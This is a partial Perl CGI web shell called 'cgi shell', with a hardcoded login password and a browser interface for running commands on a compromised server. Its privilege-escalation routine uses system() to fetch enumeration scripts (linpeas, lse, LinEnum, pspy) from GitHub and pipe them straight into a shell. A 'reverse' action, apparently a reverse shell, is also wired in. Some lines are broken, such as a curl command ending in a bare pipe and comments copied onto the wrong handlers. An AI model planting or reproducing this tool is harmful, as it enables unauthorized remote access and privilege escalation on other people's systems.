...
#------------------------------------------------------------------------------
# <b style="color:black;background-color:#3d3a3a">cgi shell</b> # server
#------------------------------------------------------------------------------
...
#------------------------------------------------------------------------------
$Password = "or4ng";		# Change this. You will need to enter this
				# to login.
...
<meta name="keywords" content="cgi shell">
<meta name="description" content="cgi shell">
</head>
<body onLoad="document.f.@_.focus()" bgcolor="#000000" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0" text="#a3a3a3">
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
<td bgcolor="#000000" bordercolor="#000000" align="center" width="1%">
<b><font size="2">#</font></b></td>
<td bgcolor="#000000" width="98%"><font face="Verdana" size="2"><b> 
<b style="color:black;background-color:#737373">cgi shell</b> Connected to $ServerName</b></font></td>
</tr>
<tr>
<td colspan="2" bgcolor="#000000"><font face="Verdana" size="2">
...
<a href="$ScriptLocation?a=linpeas&d=$EncodedCurrentDir"><font color="#FF0000">Privilege</font></a>
</font></td>
</tr>
</table>
<font size="3">
...
{
	$Message = q$</font><h1>[+] CGI - WebShell</h1><font color="#009900" size="3"><pre>
 <p>     </p>
 <img border="0" src="https://raw.githubusercontent.com/Or4ngm4n/cgi-webshell/main/perl.jpg" width="350" height="300"></pre>
 <p>[WRN] Use with caution. You are responsible for your actions.</p>
$;
#'
	print <<END;
$Message
...
<font size="3">
login: <b style="color:black;background-color:#3d3a3a">cgi shell</b><br>
...
sub linpe
{
	...
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintPageFooter;
		system("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh > linpeas.txt");
		system("curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | sh > lse.txt");
		system("curl -L https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh | sh > Lne.txt");
		system("curl -L https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh | sh > Lne.txt");
		system("curl -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 | ./pspy32 > pspy32.txt");
		system("curl -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 | ./pspy64 > pspy64.txt");
		if ($by4 == 0){
	print <<END;
	<code>
	<p>Files has been created</p>
	</form>
	</code>
END
}else{
...
sub pspy
{
	...
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintPageFooter;
		system("curl -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 | ");
		return;
	}
}
#------------------------------------------------------------------------------
...
elsif($Action eq "linpeas") # user wants to logout
{
	&linpe;
}
...
elsif($Action eq "pspy") # user wants to logout
{
	&pspy;
}
elsif($Action eq "reverse") # user wants to logout
{
	&reverse;
}
